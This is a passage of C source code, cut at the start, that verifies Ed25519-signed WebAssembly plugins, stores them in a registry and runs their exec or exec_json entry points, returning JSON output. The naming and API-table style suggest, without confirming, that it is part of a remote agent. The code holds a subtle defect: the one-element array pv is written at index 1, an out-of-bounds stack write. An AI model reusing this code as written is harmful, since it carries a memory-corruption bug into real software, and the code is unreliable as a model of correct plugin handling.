	module = (BYTE*)MemAllocLocal(moduleLen);
	if (!module || !b64_decode(modB64, module, (int)moduleLen)) {
		WJObjPutStr(res, "output", "plugin: module b64 decode failed");
		goto done;
	}
	{
		ULONG sLen = StrLenA((CHAR*)sigS);
		if (sLen == 128) {
			sig = (BYTE*)MemAllocLocal(64);
			if (!sig || !hex_decode(sigS, sig, 64, &sigLen) || sigLen != 64) {
				WJObjPutStr(res, "output", "plugin: bad signature");
				goto done;
			}
		}
		else {
			ULONG dlen = (ULONG)b64_decoded_size(sigS);
			sig = (BYTE*)MemAllocLocal(dlen ? dlen : 1);
			if (!sig || !b64_decode(sigS, sig, (int)dlen) || dlen != 64) {
				WJObjPutStr(res, "output", "plugin: bad signature");
				goto done;
			}
			sigLen = dlen;
		}
	}
	manLen = StrLenA((CHAR*)manifest);
	smLen = sigLen + manLen + moduleLen;
	sm = (BYTE*)MemAllocLocal(smLen);
	msg = (BYTE*)MemAllocLocal(smLen);
	if (!sm || !msg) {
		WJObjPutStr(res, "output", "plugin: oom");
		goto done;
	}
	memcpy(sm, sig, sigLen);
	memcpy(sm + sigLen, manifest, manLen);
	memcpy(sm + sigLen + manLen, module, moduleLen);
	if (crypto_sign_open(msg, &mlen, sm, smLen, pk) != 0) {
		WJObjPutStr(res, "output", "plugin: SIGNATURE VERIFY FAILED - refusing to load");
		goto done;
	}

	memset(tmp, 0, sizeof(*tmp));
	pcopy(tmp->id, sizeof(tmp->id), id);
	tmp->moduleCopy = module;
	tmp->moduleLen = moduleLen;
	module = NULL;
	{
		WJVal* man = WJParse(manifest, manLen);
		WJVal* abi;
		WJVal* caps;
		if (!man) {
			WJObjPutStr(res, "output", "plugin: manifest JSON");
			goto done;
		}
		abi = WJObjGet(man, "abi");
		tmp->abi = abi && abi->type == WJ_NUM ? (int)WJNumAsI64(abi, 0) : 0;
		caps = WJObjGet(man, "capabilities");
		tmp->capCount = 0;
		if (caps && caps->type == WJ_ARR) {
			ULONG k;
			for (k = 0; k < caps->count && tmp->capCount < PLUGIN_CAPS; k++) {
				WJVal* c = caps->items[k];
				if (c && c->type == WJ_STR && c->str)
					pcopy(tmp->caps[tmp->capCount++], 64, c->str);
			}
		}
		WJFree(man);
	}
	if (!wasm_parse(&tmp->mod, tmp->moduleCopy, tmp->moduleLen, tmp->abi >= 1 ? 64 : 16)) {
		WJObjPutStr(res, "output", "plugin: bad wasm module");
		goto done;
	}
	if (tmp->abi >= 1) {
		if (wasm_find_func(&tmp->mod, "alloc") == (ULONG)-1 ||
			wasm_find_func(&tmp->mod, "exec_json") == (ULONG)-1) {
			WJObjPutStr(res, "output", "plugin: missing alloc/exec_json exports");
			goto done;
		}
	}
	else if (wasm_find_func(&tmp->mod, "exec") == (ULONG)-1) {
		WJObjPutStr(res, "output", "plugin: missing exec export");
		goto done;
	}

	for (i = 0; i < PLUGIN_MAX; i++) {
		if (g_plugins[i].loaded && StrCmpA(g_plugins[i].id, (CHAR*)id) == 0) {
			plugin_clear(&g_plugins[i]);
			slot = &g_plugins[i];
			break;
		}
	}
	if (!slot) {
		for (i = 0; i < PLUGIN_MAX; i++) {
			if (!g_plugins[i].loaded) { slot = &g_plugins[i]; break; }
		}
	}
	if (!slot) {
		WJObjPutStr(res, "output", "plugin: registry full");
		goto done;
	}
	*slot = *tmp;
	slot->loaded = TRUE;
	memset(tmp, 0, sizeof(*tmp));
	{
		WJVal* o = WJNewObj();
		WJVal* arr = WJNewArr();
		char* js;
		if (!o || !arr) {
			if (o) WJFree(o);
			if (arr) WJFree(arr);
			WJObjPutStr(res, "output", "plugin: oom");
			goto done;
		}
		for (i = 0; i < slot->capCount; i++)
			WJArrPush(arr, WJNewStr(slot->caps[i]));
		WJObjPutStr(o, "loaded", id);
		WJObjPutStr(o, "version", version);
		WJObjPut(o, "capabilities", arr);
		js = WJSerialize(o);
		WJFree(o);
		if (js) {
			WJVal* s = WJNewStr(js);
			ULONG n = StrLenA(js);
			MemFreeLocal((LPVOID*)&js, n + 1);
			if (s) WJObjPut(res, "output", s);
		}
	}
	ok = TRUE;
done:
	if (module) MemFreeLocal((LPVOID*)&module, moduleLen);
	if (sig) MemFreeLocal((LPVOID*)&sig, sigLen ? sigLen : 64);
	if (sm) MemFreeLocal((LPVOID*)&sm, smLen);
	if (msg) MemFreeLocal((LPVOID*)&msg, smLen);
	if (!ok) {
		/* tmp->mod may own memory when parse succeeded but a later step failed */
		if (tmp->moduleCopy) {
			if (tmp->mod.mem) MemFreeLocal((LPVOID*)&tmp->mod.mem, tmp->mod.memPages * WASM_PAGE);
			MemFreeLocal((LPVOID*)&tmp->moduleCopy, tmp->moduleLen);
		}
	}
	return ok;
}

BOOL WispPluginExec(WJVal* args, WJVal* res)
{
	const char* id = wj_str_arg(args, "id");
	const char* entry = wj_str_arg(args, "entry");
	WPLUGIN* p;
	WCTX x;
	ULONG64 out[4];
	ULONG outN = 0;
	ULONG fn;
	BOOL ok = FALSE;

	if (!id || !entry) {
		WJObjPutStr(res, "output", "plugin: missing id/entry");
		return FALSE;
	}
	p = plugin_find(id);
	if (!p) {
		WJObjPutStr(res, "output", "plugin not loaded");
		return FALSE;
	}
	memset(&x, 0, sizeof(x));
	x.m = &p->mod;
	x.pl = p;
	x.budget = 8 * 1000 * 1000;
	x.startTick = ApiWin->GetTickCount();

	if (p->abi < 1) {
		ULONG64 a0[2];
		LONG64 av = WJNumAsI64(WJObjGet(args, "a"), 0);
		LONG64 bv = WJNumAsI64(WJObjGet(args, "b"), 0);
		fn = wasm_find_func(&p->mod, "exec");
		if (fn == (ULONG)-1) goto done;
		a0[0] = (ULONG64)(ULONG)av;
		a0[1] = (ULONG64)(ULONG)bv;
		if (!wcall(&x, fn, a0, 2, out, &outN, 0) || outN < 1) goto done;
		{
			WJVal* o = WJNewObj();
			char* js;
			if (!o) goto done;
			WJObjPutStr(o, "plugin", id);
			WJObjPutStr(o, "entry", entry);
			WJObjPutNum(o, "result", (double)(LONG)out[0]);
			js = WJSerialize(o);
			WJFree(o);
			if (!js) goto done;
			{
				WJVal* s = WJNewStr(js);
				ULONG n = StrLenA(js);
				MemFreeLocal((LPVOID*)&js, n + 1);
				if (!s) goto done;
				WJObjPut(res, "output", s);
			}
		}
		ok = TRUE;
	}
	else {
		WJVal* av = WJObjGet(args, "args");
		char* js = NULL;
		ULONG jl;
		ULONG allocFn, execFn;
		ULONG64 pv[1], rv[4];
		ULONG rn = 0;
		ULONG64 packed;
		if (av && av->type != WJ_NULL)
			js = WJSerialize(av);
		if (!js) {
			js = (char*)MemAllocLocal(3);
			if (!js) goto done;
			memcpy(js, "{}", 3);
		}
		jl = StrLenA(js);
		allocFn = wasm_find_func(&p->mod, "alloc");
		execFn = wasm_find_func(&p->mod, "exec_json");
		if (allocFn == (ULONG)-1 || execFn == (ULONG)-1) {
			MemFreeLocal((LPVOID*)&js, jl + 1);
			goto done;
		}
		pv[0] = jl;
		if (!wcall(&x, allocFn, pv, 1, rv, &rn, 0) || rn < 1) {
			MemFreeLocal((LPVOID*)&js, jl + 1);
			goto done;
		}
		if (!mem_write(&p->mod, (ULONG)rv[0], (const BYTE*)js, jl)) {
			MemFreeLocal((LPVOID*)&js, jl + 1);
			goto done;
		}
		MemFreeLocal((LPVOID*)&js, jl + 1);
		pv[0] = rv[0];
		pv[1] = jl;
		if (!wcall(&x, execFn, pv, 2, rv, &rn, 0) || rn < 1)
			goto done;
		packed = rv[0];
		if (packed == 0) {
			WJVal* o = WJNewObj();
			char* outjs;
			if (!o) goto done;
			WJObjPutStr(o, "plugin", id);
			WJObjPutStr(o, "entry", entry);
			WJObjPutStr(o, "result", "{\"ok\":true}");
			outjs = WJSerialize(o);
			WJFree(o);
			if (!outjs) goto done;
			{
				WJVal* s = WJNewStr(outjs);
				ULONG n = StrLenA(outjs);
				MemFreeLocal((LPVOID*)&outjs, n + 1);
				if (s) WJObjPut(res, "output", s);
			}
			ok = TRUE;
		}
		else {
			ULONG rptr = (ULONG)(packed >> 32);
			ULONG rlen = (ULONG)(packed & 0xFFFFFFFFu);
			BYTE* raw;
			WJVal* rvj;
			if (rlen == 0 || rlen > 4 * 1024 * 1024) goto done;
			raw = (BYTE*)MemAllocLocal(rlen);
			if (!raw) goto done;
			if (!mem_read(&p->mod, rptr, rlen, raw)) {
				MemFreeLocal((LPVOID*)&raw, rlen);
				goto done;
			}
			rvj = WJParse((const char*)raw, rlen);
			if (!rvj) {
				MemFreeLocal((LPVOID*)&raw, rlen);
				goto done;
			}
			{
				WJVal* o = WJNewObj();
				char* outjs;
				if (!o) { WJFree(rvj); MemFreeLocal((LPVOID*)&raw, rlen); goto done; }
				WJObjPutStr(o, "plugin", id);
				WJObjPutStr(o, "entry", entry);
				WJObjPut(o, "result", rvj);
				outjs = WJSerialize(o);
				WJFree(o);
				MemFreeLocal((LPVOID*)&raw, rlen);
				if (!outjs) goto done;
				{
					WJVal* s = WJNewStr(outjs);
					ULONG n = StrLenA(outjs);
					MemFreeLocal((LPVOID*)&outjs, n + 1);
					if (s) WJObjPut(res, "output", s);
				}
			}
			ok = TRUE;
		}
	}
done:
	if (!ok) {
		plugin_clear(p);
		WJObjPutStr(res, "output", "plugin exec failed");
	}
	return ok;
}
